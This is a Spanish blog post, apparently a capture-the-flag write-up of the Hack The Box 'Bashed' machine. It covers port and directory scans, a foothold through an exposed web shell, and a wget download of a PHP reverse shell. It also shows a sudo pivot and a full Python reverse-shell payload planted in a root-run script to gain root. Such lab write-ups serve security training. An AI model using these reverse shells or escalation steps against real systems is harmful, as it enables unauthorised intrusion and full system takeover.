---
layout: post
title: Hack The Box Bashed Write-Up
date: 2025-01-26
categories: [Write-Ups, HackTheBox, Machine, Easy]
tags: [Easy]
image: /assets/post_details/bashed/bashed_front_image.png
---
# Hack The Box: Bashed Write-Up
## Enumeration
Realizamos la enumeración de puertos y de servicios, en este caso tiene el puerto 80 abierto, en el que se aloja un Apache con una versión reciente, el parece correr una pagina portfolio de desarrollo de `Arrexel`.
```bash
nmap -p80 -sCV -n -Pn 10.10.10.68 -oN full_scan.txt
```
![nmap](/assets/post_details/bashed/bashed_nmap.png)
### Blog Arrexel - HTTP(80)
La pagina es un blog, en el que el usuario `Arrexel` ha colgado un post, en el enseña su nueva utilidad la cual es una web-shell, llamada [phpbash](https://github.com/Arrexel/phpbash).
![web](/assets/post_details/bashed/bashed_web.png)
#### Fuzzing
Realizamos un escaneo de directorios con la herramienta **gobuster** con la que encontramos el directorio `/dev`, este directorio podria contener herramientas de desarrollo o una pagina de producción.
```bash
gobuster dir -u http://10.10.10.68/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20
```
![fuzzing](/assets/post_details/bashed/bashed_fuzzing.png)

En este caso es un **Directory Listing** con la herramienta del usuario `Arrexel`.
![directory listing](/assets/post_details/bashed/bashed_directory-listing.png)
#### FootHold Persistence Shell
Con esta herramienta, podemos lanzar comandos a nivel de sistema con el usuario que corre el servicio apache, el cual es `www-data`.
![phpbash](/assets/post_details/bashed/bashed_phpbash-persistence.png)

Esta bien tener una shell a nivel de buscador, pero por mayor comodidad vamos a lanzarnos una shell en nuestra maquina, hacemos uso de la rev shell [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/tree/master), ya que se esta ejecutando codigo php, seremos capaces de lanzar esta rev shell. 
```bash
www-data@bashed:/var/www/html/dev# cd ..

www-data@bashed:/var/www/html# cd uploads
# Local machine
python3 -m http.server 80

www-data@bashed:/var/www/html# wget http://10.10.14.14/php-reverse-shell
```
![getshell](/assets/post_details/bashed/bashed_getshell.png)

Una vez tenemos la shell, podemos obtener la flag del usuario `arrexel`.
![user flag](/assets/post_details/bashed/bashed_flag.png)
## PrivEsc
### arrexel -> scriptmanager
Si realizamos un `sudo -l`, vemos que tenemos privilegio sobre el usuario `scriptmanager` debido a una desconfiguración de los **sudoers**.
![sudo -l](/assets/post_details/bashed/bashed_sudo-l.png)

Con `sudo -u scriptmanager bash` podemos lanzarnos una bash como el usuario `scriptmanager`, deberemos de hacer tratamiento de tty.
```bash
sudo -u scriptmanager bash -i
```
### scriptmanager -> root
Enumerando las procesos, vemos que el usuario `root` esta ejecutando cada par de minutos un archivo python.
```bash
ps aux
```
![ps aux](/assets/post_details/bashed/bashed_ps-aux.png)

Si listamos el directorio raiz, vemos que la carpeta `scripts` es creada por el usuario `scriptmanager`.
![](/assets/post_details/bashed/bashed_scripts-folder.png)

Es esta carpeta la que contiene el fichero el cual estaba ejecutando el usuario `root`, este fichero lo podemos modificar con el usuario `scriptmanager`.
```bash
scriptmanager@bashed:/$ ls -la /scripts
test.py  test.txt
```
![files](/assets/post_details/bashed/bashed_scriptmanager-files.png)

Por lo que vamos a meter una rev-shell de python para que asi cuando ejecute el usuario `root` el script, nos lance la shell como usuario `root`.
```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.14",1234));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty; 
pty.spawn("bash");
```
![getsystem](/assets/post_details/bashed/bashed_getsystem.png)